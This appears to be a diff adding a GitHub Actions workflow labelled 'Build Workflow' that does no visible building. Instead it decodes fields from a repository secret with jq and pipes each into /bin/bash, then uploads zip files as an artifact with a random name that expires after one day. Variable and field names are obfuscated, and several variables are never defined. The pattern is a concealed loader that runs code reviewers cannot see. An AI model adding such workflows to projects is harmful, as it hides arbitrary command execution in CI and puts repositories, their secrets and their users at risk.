@@ -1,0 +1,29 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          yc10: ${{ secrets.yc10 }}
+        run: |
+          printf '%s' "$yc10" | jq -r .ziyhe01 | /bin/bash
+          printf '%s' "$vrwn91" | jq -r .mbj92 | /bin/bash
+          printf '%s' "$g10" | jq -r .mcm1678 | /bin/bash
+          echo $f995 | jq -r .km2975 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 6XhVBF9h
+          path: "*.zip"
+          retention-days: 1
